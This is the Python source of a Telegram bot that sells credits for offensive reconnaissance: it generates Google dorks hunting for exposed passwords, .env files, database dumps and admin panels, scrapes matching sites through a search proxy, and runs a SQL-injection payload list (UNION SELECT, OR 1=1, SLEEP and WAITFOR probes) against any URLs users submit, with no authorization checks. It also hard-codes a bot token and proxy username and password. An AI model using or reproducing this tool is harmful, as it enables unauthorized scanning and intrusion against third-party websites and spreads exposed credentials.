import io
import json
import os
import uuid
import logging
import asyncio
import traceback
import aiohttp
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import (
    ApplicationBuilder, ContextTypes, MessageHandler,
    CommandHandler, CallbackQueryHandler, filters
)

# --- CONFIG ---
TELEGRAM_TOKEN = "7545064228:AAHYqBGcXGJpK1WUp68-uuLZjMjTiPEPb2o"
OXY_USER = "Pika1_MhRPr"
OXY_PASS = "Pika=1234pika"
OWNER_IDS = {7214730073, 8003049490}
DB_FILE = "users_db.json"

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger("AlephBot")

# --- DATABASE ---
def load_db():
    if not os.path.exists(DB_FILE):
        return {}
    with open(DB_FILE, 'r') as f:
        return json.load(f)

def save_db(db_data):
    with open(DB_FILE, 'w') as f:
        json.dump(db_data, f, indent=2)

def get_user(user_id):
    uid = str(user_id)
    if uid not in db:
        db[uid] = {"credits": 0, "banned": False, "uses": 0}
        save_db(db)
    return db[uid]

db = load_db()
active_keys = {}
user_states = {}

# ──────────────────────────────────────────────
#  VISUAL HELPERS
# ──────────────────────────────────────────────

DIVIDER = "─────────────────────────"

def progress_bar(done, total, width=12):
    filled = int(width * done / total) if total else 0
    bar = "█" * filled + "░" * (width - filled)
    pct = int(100 * done / total) if total else 0
    return f"`[{bar}]` {pct}%"

def credits_line(user_data):
    c = user_data.get("credits", 0)
    return f"💰 Credits: `{c}`"

def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🛠  Dork Generator", callback_data='mode_gen')],
        [InlineKeyboardButton("🔎  Deep Parser", callback_data='mode_parse')],
        [InlineKeyboardButton("💉  SQL Tester", callback_data='mode_sql')],
        [InlineKeyboardButton("💰  My Balance", callback_data='show_balance')],
        [InlineKeyboardButton("❓  Help", callback_data='show_help')],
    ])

WELCOME_TEXT = (
    "🌐 *Aleph Null \— Sovereign Engine*\n"
    f"{DIVIDER}\n\n"
    "Welcome\\! Pick a module below to get started\\.\n"
    "If this is your first time, tap *Help* first\\.\n\n"
    "📌 *Quick Start:*\n"
    "  1️⃣  Choose a mode\n"
    "  2️⃣  Send your data \\(file or text\\)\n"
    "  3️⃣  Get results\\!\n\n"
    f"{DIVIDER}"
)

HELP_TEXT = (
    "❓ *How to Use This Bot*\n"
    f"{DIVIDER}\n\n"
    "🛠 *Dork Generator*  \\(FREE\\)\n"
    "  Turns keywords into Google dorks\\.\n"
    "  → Send keywords, one per line, or upload a \\.txt file\\.\n"
    "  _Example: just type_ `admin` _and send\\!_\n\n"
    "🔎 *Deep Parser*  \\(5 credits/dork\\)\n"
    "  Scrapes real Google results for your dorks\\.\n"
    "  → Send dorks, one per line, or upload a \\.txt file\\.\n"
    "  _Example:_ `inurl:php?id=`\n\n"
    "💉 *SQL Tester*  \\(5 credits/URL\\)\n"
    "  Tests URLs for SQL injection vulnerabilities\\.\n"
    "  → Send URLs with parameters, one per line\\.\n"
    "  _Example:_ `http://site.com/page.php?id=1`\n\n"
    f"{DIVIDER}\n"
    "📝 *Commands:*\n"
    "  /start  — Main menu\n"
    "  /menu   — Back to main menu\n"
    "  /help   — This guide\n"
    "  /balance — Check your credits\n"
    "  /redeem `KEY` — Redeem a credit key\n\n"
    f"{DIVIDER}\n"
    "💡 *Tips:*\n"
    "• You can send data as plain text OR as a \\.txt file\n"
    "• One item per line when sending as text\n"
    "• Generator mode is free — no credits needed\\!"
)

MODE_GEN_TEXT = (
    "🛠 *Dork Generator*\n"
    f"{DIVIDER}\n\n"
    "Send me your *keywords* and I'll generate\n"
    "powerful Google dorks from them\\.\n\n"
    "📝 *How to send:*\n"
    "• Type keywords below \\(one per line\\)\n"
    "• Or upload a `.txt` file\n\n"
    "💡 _Example — just type and send:_\n"
    "`admin`\n"
    "`password`\n"
    "`config`\n\n"
    "🆓 This mode is *free* — no credits needed\\!"
)

MODE_PARSE_TEXT = (
    "🔎 *Deep Parser*\n"
    f"{DIVIDER}\n\n"
    "Send me your *dorks* and I'll scrape\n"
    "real Google results for each one\\.\n\n"
    "📝 *How to send:*\n"
    "• Type dorks below \\(one per line\\)\n"
    "• Or upload a `.txt` file\n\n"
    "💡 _Example — just type and send:_\n"
    '`inurl:php?id=`\n'
    '`filetype:sql password`\n\n'
    "💰 *Cost:* `5` credits per dork"
)

MODE_SQL_TEXT = (
    "💉 *SQL Tester*\n"
    f"{DIVIDER}\n\n"
    "Send me *URLs with parameters* and I'll\n"
    "test each one for SQL injection\\.\n\n"
    "📝 *How to send:*\n"
    "• Type URLs below \\(one per line\\)\n"
    "• Or upload a `.txt` file\n\n"
    "💡 _Example — just type and send:_\n"
    "`http://example.com/page.php?id=1`\n"
    "`http://site.com/item?cat=5&pid=2`\n\n"
    "💰 *Cost:* `5` credits per URL"
)

# ──────────────────────────────────────────────
#  SQL SCANNER
# ──────────────────────────────────────────────

SQL_PAYLOADS = [
    "'", "''", "`", "\"", "')", "'))", "')))", "\";",
    " order by 10--", " union select 1,2,3,4,5,6--",
    " OR 1=1--", "admin' --", "' OR 'a'='a",
    " AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
    " %' OR '1'='1", "';", "\\", "%27",
    "WAITFOR DELAY '0:0:5'--", "OR 1=1#", "') OR ('1'='1"
]

SQL_ERRORS = [
    "SQL syntax", "mysql_fetch_array", "MySQL Error", "PostgreSQL",
    "Microsoft OLE DB Provider for SQL Server", "JDBC Driver",
    "SQLite/JDBCDriver", "System.Data.SqlClient.SqlException",
    "Invision Power Board Database Error", "Warning: mysql_connect()",
    "Driver [pdo_mysql]", "ORA-00933", "Syntax error in SQL statement",
    "Dynamic SQL Error", "valid MySQL result",
    "Unclosed quotation mark after the character string",
    "pg_query(): Query failed", "SQLITE_ERROR",
    "Warning: pg_exec()", "supplied argument is not a valid MySQL"
]

async def check_sql(session, url):
    if "?" not in url:
        logger.debug("SQL skip (no params): %s", url)
        return None

    base_part = url.split("?")[0]
    params = url.split("?")[1].split("&")

    tasks = []
    for payload in SQL_PAYLOADS:
        for i in range(len(params)):
            new_params = list(params)
            new_params[i] += payload
            test_url = f"{base_part}?{'&'.join(new_params)}"
            tasks.append(_sql_test_single(session, test_url))

    logger.info("SQL testing %s — %d payloads", url, len(tasks))
    results = await asyncio.gather(*tasks)
    found = next((r for r in results if r), None)
    if found:
        logger.info("SQL VULN: %s", found)
    return found

async def _sql_test_single(session, test_url):
    try:
        async with session.get(
            test_url,
            timeout=aiohttp.ClientTimeout(total=10),
            ssl=False
        ) as resp:
            body = await resp.text()
            if any(e.lower() in body.lower() for e in SQL_ERRORS):
                return f"[VULN] {test_url}"
    except asyncio.TimeoutError:
        pass
    except aiohttp.ClientError:
        pass
    except Exception as e:
        logger.debug("SQL unexpected: %s — %s", test_url, e)
    return None

# ──────────────────────────────────────────────
#  DORK GENERATOR
# ──────────────────────────────────────────────

DORK_PATTERNS = [
    'intitle:"index of" "{kw}"',
    'filetype:sql "password" "{kw}"',
    'filetype:env "DB_PASSWORD" "{kw}"',
    '"{kw}" intext:"DB_PASSWORD" extension:env',
    'site:s3.amazonaws.com "{kw}"',
    'site:firebaseio.com "{kw}"',
    'filetype:log "{kw}"',
    'extension:json "{kw}" "api_key"',
    'intitle:"index of /" "{kw}" "admin"',
    'inurl:php?id= "{kw}"',
    'inurl:config.php.bak "{kw}"',
    'intitle:"Index of" ".git" "{kw}"',
    'inurl:admin/login.php "{kw}"',
    'inurl:wp-content/uploads/ "{kw}"',
    'filetype:xls "{kw}" email password',
    'allintext:"connectionString" extension:config "{kw}"',
]

def generate_dorks(keywords):
    out = []
    for kw in keywords:
        for p in DORK_PATTERNS:
            out.append(p.format(kw=kw))
    return out

# ──────────────────────────────────────────────
#  GOOGLE PARSER (Oxylabs)
# ──────────────────────────────────────────────

async def fetch_oxylabs_results(session, query):
    url = "https://realtime.oxylabs.io/v1/queries"
    payload = {
        "source": "google_search",
        "query": query,
        "user_agent_type": "desktop_chrome",
        "parse": True,
        "start_page": 1,
        "pages": 10,
        "limit": 50,
    }
    logger.info("PARSER query: %.120s", query)

    try:
        async with session.post(
            url,
            auth=aiohttp.BasicAuth(OXY_USER, OXY_PASS),
            json=payload,
            timeout=aiohttp.ClientTimeout(total=90),
        ) as r:
            body_text = await r.text()

            if r.status != 200:
                logger.error(
                    "PARSER HTTP %d for: %.80s — %.500s",
                    r.status, query, body_text,
                )
                return []

            try:
                data = json.loads(body_text)
            except json.JSONDecodeError as je:
                logger.error("PARSER bad JSON: %s — %.500s", je, body_text)
                return []

            urls = []
            for page in data.get("results", []):
                organic = (
                    page.get("content", {})
                    .get("results", {})
                    .get("organic", [])
                )
                for item in organic:
                    u = item.get("url")
                    if u:
                        urls.append(u)

            logger.info("PARSER got %d URLs for: %.80s", len(urls), query)
            return urls

    except asyncio.TimeoutError:
        logger.error("PARSER timeout: %.120s", query)
        return []
    except aiohttp.ClientError as e:
        logger.error("PARSER network error: %s — %s", query, e)
        return []
    except Exception as e:
        logger.error("PARSER error: %s\n%s", e, traceback.format_exc())
        return []

# ──────────────────────────────────────────────
#  HELPERS
# ──────────────────────────────────────────────

def is_banned(user_id):
    return db.get(str(user_id), {}).get("banned", False)

def escape_md(text):
    special = r'_*[]()~`>#+-=|{}.!'
    out = []
    for ch in text:
        if ch in special:
            out.append(f'\\{ch}')
        else:
            out.append(ch)
    return ''.join(out)

# ──────────────────────────────────────────────
#  COMMAND HANDLERS
# ──────────────────────────────────────────────

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_banned(update.effective_user.id):
        return
    get_user(update.effective_user.id)
    await update.message.reply_text(
        WELCOME_TEXT,
        reply_markup=main_menu_keyboard(),
        parse_mode=ParseMode.MARKDOWN_V2,
    )

async def cmd_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_banned(update.effective_user.id):
        return
    await update.message.reply_text(
        WELCOME_TEXT,
        reply_markup=main_menu_keyboard(),
        parse_mode=ParseMode.MARKDOWN_V2,
    )

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_banned(update.effective_user.id):
        return
    back_btn = InlineKeyboardMarkup([
        [InlineKeyboardButton("⬅️  Back to Menu", callback_data='back_menu')]
    ])
    await update.message.reply_text(
        HELP_TEXT,
        parse_mode=ParseMode.MARKDOWN_V2,
        reply_markup=back_btn,
    )

async def cmd_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_banned(update.effective_user.id):
        return
    user_data = get_user(update.effective_user.id)
    credits = user_data.get("credits", 0)
    uses = user_data.get("uses", 0)
    text = (
        f"💰 *Your Balance*\n"
        f"{DIVIDER}\n\n"
        f"   Credits: `{credits}`\n"
        f"   Total uses: `{uses}`\n\n"
        f"Use /redeem `KEY` to add credits\\."
    )
    back_btn = InlineKeyboardMarkup([
        [InlineKeyboardButton("⬅️  Back to Menu", callback_data='back_menu')]
    ])
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN_V2, reply_markup=back_btn)

async def cmd_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_banned(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text(
            "📝 *Usage:* `/redeem YOUR-KEY`\n\n"
            "Example: `/redeem ALEPH-A1B2C3`",
            parse_mode=ParseMode.MARKDOWN_V2,
        )
        return
    user_id = str(update.effective_user.id)
    key = context.args[0].upper()
    if key in active_keys:
        val = active_keys.pop(key)
        user_data = get_user(user_id)
        user_data["credits"] = user_data.get("credits", 0) + val
        db[user_id] = user_data
        save_db(db)
        await update.message.reply_text(
            f"✅ *Key Redeemed\\!*\n\n"
            f"   \\+`{val}` credits added\n"
            f"   Balance: `{user_data['credits']}`",
            parse_mode=ParseMode.MARKDOWN_V2,
        )
    else:
        await update.message.reply_text(
            "❌ *Invalid or expired key\\.*\n\n"
            "Double\\-check the key and try again\\.",
            parse_mode=ParseMode.MARKDOWN_V2,
        )

# --- OWNER COMMANDS ---

async def cmd_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in OWNER_IDS:
        return
    if not context.args:
        await update.message.reply_text("Usage: /ban USER_ID")
        return
    target_id = str(context.args[0])
    db[target_id] = {"credits": 0, "banned": True}
    save_db(db)
    await update.message.reply_text(f"🚫 User `{target_id}` banned\\.", parse_mode=ParseMode.MARKDOWN_V2)

async def cmd_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in OWNER_IDS:
        return
    if not context.args:
        await update.message.reply_text("Usage: /key AMOUNT")
        return
    try:
        val = int(context.args[0])
    except ValueError:
        await update.message.reply_text("Amount must be a number\\.", parse_mode=ParseMode.MARKDOWN_V2)
        return
    key = f"ALEPH-{uuid.uuid4().hex[:8].upper()}"
    active_keys[key] = val
    await update.message.reply_text(
        f"🔑 *New Key Created*\n\n"
        f"   Key: `{key}`\n"
        f"   Credits: `{val}`\n\n"
        f"Share this key with a user\\.",
        parse_mode=ParseMode.MARKDOWN_V2,
    )

# ──────────────────────────────────────────────
#  BUTTON HANDLER
# ──────────────────────────────────────────────

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    if is_banned(user_id):
        return
    await query.answer()

    back_btn = InlineKeyboardMarkup([
        [InlineKeyboardButton("⬅️  Back to Menu", callback_data='back_menu')]
    ])

    if query.data == 'back_menu':
        await query.edit_message_text(
            WELCOME_TEXT,
            reply_markup=main_menu_keyboard(),
            parse_mode=ParseMode.MARKDOWN_V2,
        )

    elif query.data == 'mode_gen':
        user_states[user_id] = "GENERATOR"
        await query.edit_message_text(
            MODE_GEN_TEXT,
            parse_mode=ParseMode.MARKDOWN_V2,
            reply_markup=back_btn,
        )

    elif query.data == 'mode_parse':
        user_states[user_id] = "PARSER"
        user_data = get_user(user_id)
        credits = user_data.get("credits", 0)
        extra = f"\n\n{credits_line(user_data)}"
        await query.edit_message_text(
            MODE_PARSE_TEXT + f"\n{escape_md(extra)}",
            parse_mode=ParseMode.MARKDOWN_V2,
            reply_markup=back_btn,
        )

    elif query.data == 'mode_sql':
        user_states[user_id] = "SQL"
        user_data = get_user(user_id)
        extra = f"\n\n{credits_line(user_data)}"
        await query.edit_message_text(
            MODE_SQL_TEXT + f"\n{escape_md(extra)}",
            parse_mode=ParseMode.MARKDOWN_V2,
            reply_markup=back_btn,
        )

    elif query.data == 'show_balance':
        user_data = get_user(user_id)
        credits = user_data.get("credits", 0)
        uses = user_data.get("uses", 0)
        text = (
            f"💰 *Your Balance*\n"
            f"{DIVIDER}\n\n"
            f"   Credits: `{credits}`\n"
            f"   Total uses: `{uses}`\n\n"
            f"Use /redeem `KEY` to add credits\\."
        )
        await query.edit_message_text(
            text,
            parse_mode=ParseMode.MARKDOWN_V2,
            reply_markup=back_btn,
        )

    elif query.data == 'show_help':
        await query.edit_message_text(
            HELP_TEXT,
            parse_mode=ParseMode.MARKDOWN_V2,
            reply_markup=back_btn,
        )

# ──────────────────────────────────────────────
#  CORE PROCESSING
# ──────────────────────────────────────────────

async def process_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, input_data: list):
    user_id = str(update.effective_user.id)
    mode = user_states.get(update.effective_user.id)
    logger.info("process: user=%s mode=%s items=%d", user_id, mode, len(input_data))

    if not mode:
        await update.message.reply_text(
            "⚠️ *No mode selected\\!*\n\n"
            "Tap /start and choose a module first\\.",
            parse_mode=ParseMode.MARKDOWN_V2,
        )
        return

    # ── GENERATOR (free) ──
    if mode == "GENERATOR":
        status_msg = await update.message.reply_text(
            f"🛠 *Generating dorks\\.\\.\\.*\n"
            f"   Keywords: `{len(input_data)}`\n\n"
            f"{progress_bar(0, 1)}",
            parse_mode=ParseMode.MARKDOWN_V2,
        )
        dorks = generate_dorks(input_data)
        out = io.BytesIO("\n".join(dorks).encode())
        out.name = "generated_dorks.txt"

        user_data = get_user(user_id)
        user_data["uses"] = user_data.get("uses", 0) + 1
        db[user_id] = user_data
        save_db(db)

        await status_msg.edit_text(
            f"✅ *Dorks Generated\\!*\n"
            f"{DIVIDER}\n\n"
            f"   Keywords: `{len(input_data)}`\n"
            f"   Dorks created: `{len(dorks)}`\n\n"
            f"{progress_bar(1, 1)}",
            parse_mode=ParseMode.MARKDOWN_V2,
        )
        await update.message.reply_document(
            document=out,
            caption=f"🛠 {len(dorks)} dorks from {len(input_data)} keywords",
        )
        return

    # ── PARSER / SQL (costs credits) ──
    cost = len(input_data) * 5
    user_data = get_user(user_id)
    credits = user_data.get("credits", 0)

    if credits < cost:
        await update.message.reply_text(
            f"❌ *Not Enough Credits*\n"
            f"{DIVIDER}\n\n"
            f"   Required: `{cost}` \\({len(input_data)} × 5\\)\n"
            f"   Your balance: `{credits}`\n\n"
            f"Use /redeem `KEY` to add more credits\\.",
            parse_mode=ParseMode.MARKDOWN_V2,
        )
        return

    mode_label = "Deep Parser" if mode == "PARSER" else "SQL Tester"
    mode_icon = "🔎" if mode == "PARSER" else "💉"
    item_word = "dorks" if mode == "PARSER" else "URLs"

    status_msg = await update.message.reply_text(
        f"{mode_icon} *{escape_md(mode_label)} — Running*\n"
        f"{DIVIDER}\n\n"
        f"   Items: `{len(input_data)}` {item_word}\n"
        f"   Cost: `{cost}` credits\n\n"
        f"{progress_bar(0, len(input_data))}\n\n"
        f"⏳ Please wait\\.\\.\\.",
        parse_mode=ParseMode.MARKDOWN_V2,
    )

    results_list = []
    errors_count = 0

    try:
        async with aiohttp.ClientSession() as session:
            if mode == "PARSER":
                batch_size = 3
                for i in range(0, len(input_data), batch_size):
                    chunk = input_data[i:i + batch_size]
                    batch = await asyncio.gather(
                        *(fetch_oxylabs_results(session, d) for d in chunk),
                        return_exceptions=True,
                    )
                    for r in batch:
                        if isinstance(r, Exception):
                            errors_count += 1
                            logger.error("PARSER exception: %s", r)
                        elif isinstance(r, list):
                            results_list.extend(r)

                    done = min(i + batch_size, len(input_data))
                    try:
                        await status_msg.edit_text(
                            f"{mode_icon} *{escape_md(mode_label)} — Running*\n"
                            f"{DIVIDER}\n\n"
                            f"   Processed: `{done}/{len(input_data)}` {item_word}\n"
                            f"   Found so far: `{len(results_list)}` URLs\n\n"
                            f"{progress_bar(done, len(input_data))}\n\n"
                            f"⏳ Please wait\\.\\.\\.",
                            parse_mode=ParseMode.MARKDOWN_V2,
                        )
                    except Exception:
                        pass
            else:
                batch_size = 5
                for i in range(0, len(input_data), batch_size):
                    chunk = input_data[i:i + batch_size]
                    batch = await asyncio.gather(
                        *(check_sql(session, url) for url in chunk),
                        return_exceptions=True,
                    )
                    for r in batch:
                        if isinstance(r, Exception):
                            errors_count += 1
                            logger.error("SQL exception: %s", r)
                        elif r:
                            results_list.append(r)

                    done = min(i + batch_size, len(input_data))
                    try:
                        await status_msg.edit_text(
                            f"{mode_icon} *{escape_md(mode_label)} — Running*\n"
                            f"{DIVIDER}\n\n"
                            f"   Scanned: `{done}/{len(input_data)}` URLs\n"
                            f"   Vulns found: `{len(results_list)}`\n\n"
                            f"{progress_bar(done, len(input_data))}\n\n"
                            f"⏳ Please wait\\.\\.\\.",
                            parse_mode=ParseMode.MARKDOWN_V2,
                        )
                    except Exception:
                        pass

    except Exception as e:
        logger.error("Session error: %s\n%s", e, traceback.format_exc())
        await status_msg.edit_text(
            f"❌ *Error During Scan*\n"
            f"{DIVIDER}\n\n"
            f"   `{escape_md(str(e))}`\n\n"
            f"Credits were *not* deducted\\.\n"
            f"Try again or contact support\\.",
            parse_mode=ParseMode.MARKDOWN_V2,
        )
        return

    user_data["credits"] -= cost
    user_data["uses"] = user_data.get("uses", 0) + 1
    db[user_id] = user_data
    save_db(db)

    final_results = list(set(results_list))
    logger.info(
        "%s done: user=%s raw=%d unique=%d credits=%d",
        mode, user_id, len(results_list), len(final_results), user_data["credits"],
    )

    error_note = ""
    if errors_count:
        error_note = f"\n   ⚠️ Errors: `{errors_count}` \\(some items may have failed\\)\n"

    if not final_results:
        result_word = "results" if mode == "PARSER" else "vulnerabilities"
        await status_msg.edit_text(
            f"{mode_icon} *{escape_md(mode_label)} — Complete*\n"
            f"{DIVIDER}\n\n"
            f"   Items scanned: `{len(input_data)}`\n"
            f"   {escape_md(result_word.title())} found: `0`\n"
            f"{error_note}\n"
            f"{progress_bar(1, 1)}\n\n"
            f"💰 Remaining credits: `{user_data['credits']}`",
            parse_mode=ParseMode.MARKDOWN_V2,
        )
    else:
        f_out = io.BytesIO("\n".join(final_results).encode())
        tag = "parsed_urls" if mode == "PARSER" else "sql_vulns"
        f_out.name = f"{tag}_{datetime.now().strftime('%H%M%S')}.txt"

        await status_msg.edit_text(
            f"{mode_icon} *{escape_md(mode_label)} — Complete*\n"
            f"{DIVIDER}\n\n"
            f"   Items scanned: `{len(input_data)}`\n"
            f"   Results found: `{len(final_results)}`\n"
            f"{error_note}\n"
            f"{progress_bar(1, 1)}\n\n"
            f"💰 Remaining credits: `{user_data['credits']}`\n\n"
            f"📄 Results file attached below ⬇️",
            parse_mode=ParseMode.MARKDOWN_V2,
        )
        await update.message.reply_document(
            document=f_out,
            caption=f"{mode_icon} {len(final_results)} results — credits left: {user_data['credits']}",
        )

# ──────────────────────────────────────────────
#  INPUT HANDLERS (file + text)
# ──────────────────────────────────────────────

async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_banned(update.effective_user.id):
        return

    user_id = update.effective_user.id
    mode = user_states.get(user_id)
    logger.info("file: user=%s mode=%s file=%s", user_id, mode, update.message.document.file_name)

    if not mode:
        await update.message.reply_text(
            "⚠️ *No mode selected\\!*\n\n"
            "Tap /start and choose a module first\\.",
            parse_mode=ParseMode.MARKDOWN_V2,
        )
        return

    try:
        tg_file = await context.bot.get_file(update.message.document.file_id)
        raw = await tg_file.download_as_bytearray()
        lines = [l.strip() for l in raw.decode("utf-8").splitlines() if l.strip()]
        logger.info("file: %d lines parsed", len(lines))

        if not lines:
            await update.message.reply_text(
                "⚠️ *Empty file\\!*\n\n"
                "The uploaded file has no content\\.\n"
                "Make sure it has one item per line\\.",
                parse_mode=ParseMode.MARKDOWN_V2,
            )
            return

        await process_logic(update, context, lines)

    except Exception as e:
        logger.error("file error: %s\n%s", e, traceback.format_exc())
        await update.message.reply_text(
            f"❌ *File Error*\n\n"
            f"   `{escape_md(str(e))}`\n\n"
            f"Make sure it's a valid UTF\\-8 text file\\.",
            parse_mode=ParseMode.MARKDOWN_V2,
        )

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_banned(update.effective_user.id):
        return
    if not update.message or not update.message.text:
        return

    user_id = update.effective_user.id
    mode = user_states.get(user_id)

    if not mode:
        return

    text = update.message.text.strip()
    if text.startswith("/"):
        return

    lines = [l.strip() for l in text.splitlines() if l.strip()]
    if not lines:
        return

    logger.info("text: user=%s mode=%s lines=%d", user_id, mode, len(lines))
    await process_logic(update, context, lines)

# ──────────────────────────────────────────────
#  MAIN
# ──────────────────────────────────────────────

if __name__ == "__main__":
    logger.info("Starting bot...")
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("menu", cmd_menu))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("balance", cmd_balance))
    app.add_handler(CommandHandler("redeem", cmd_redeem))
    app.add_handler(CommandHandler("key", cmd_key))
    app.add_handler(CommandHandler("ban", cmd_ban))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), file_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

    logger.info("Bot ready — polling...")
    app.run_polling()
